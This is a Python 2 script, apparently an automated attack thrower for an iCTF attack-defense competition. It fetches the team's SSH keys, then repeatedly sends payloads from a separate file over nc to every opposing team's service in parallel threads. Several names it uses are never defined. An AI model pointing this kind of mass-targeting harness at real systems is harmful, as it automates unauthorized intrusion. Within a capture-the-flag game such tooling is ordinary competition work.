import json

with open('config.json') as json_data_file:
    config = json.load(json_data_file)
print(config)

with open('payload.json') as json_data_file:
    payload = json.load(json_data_file)
print(payload)


def attack_binary_payloads(t,service,target,ctf_key):
    # print "ATTACK"
    host = target['hostname']
    host = host[4:]
    hostIp = IP + host
    flagId = target['flag_id']
    
    # Change the logic according to the behaviour of the service
    # Add payload to be sent to payload.json file
    try:
        r = shell.run("nc " + hostIp + " " + str(target["port"]))
        r.recvline()
        r.send(payload["1"])  #Replace the payload number here
       
    except:
        global fails
        obj=[hostIp,target["team_name"]]
        if target["port"] in fails:
            fails[target["port"]].append(obj)
        else:
            fails[target["port"]]=[obj]
        print "Error on IP " + hostIp


# Login to iCTF server and get ssh keys of our server
ictf = iCTF(config["ctf_ip"])
t = ictf.login(config["team_id"],config["team_pass"])
key_info = t.get_ssh_keys()
print json.dumps(key_info, indent=4, sort_keys=True)

with open('Run_Status', 'wb') as f:
    f.write("\n")

with open('ctf_key', 'wb') as f:
    f.write(key_info['ctf_key'])

with open('root_key', 'wb') as f:
    f.write(key_info['root_key'])

chmod_command = "chmod 600 ctf_key"
os.system(chmod_command)
chmod_command = "chmod 600 root_key"
os.system(chmod_command)

ctf_key=paramiko.RSAKey.from_private_key_file("ctf_key")
shell = pwn.ssh(host=key_info['ip'], user="ctf", port=key_info['port'],
                    key=ctf_key,timeout=30)
while(True):
    fails = {}
    services= t.get_service_list()
    for service in services:
        print json.dumps(service, indent=4, sort_keys=True)
        targets=t.get_targets(service['service_id'])
        # print json.dumps(targets, indent=4, sort_keys=True)
        for target in targets["targets"]:
            print json.dumps(target, indent=4, sort_keys=True)
            if target['port']==config["service_id_binary"]:
            	thread.start_new_thread(attack_binary_payloads, (t,service,target,ctf_key))
            else:
                pass
  
    count=count+1
    with open('Run_Status', 'a') as f:
        f.write("\n")
        f.write("Time: "+time.asctime( time.localtime(time.time()))+" Run Number: "+str(count))
        f.write("\n")
        f.write(json.dumps(fails, indent=4, sort_keys=True))
    time.sleep(config["delay"])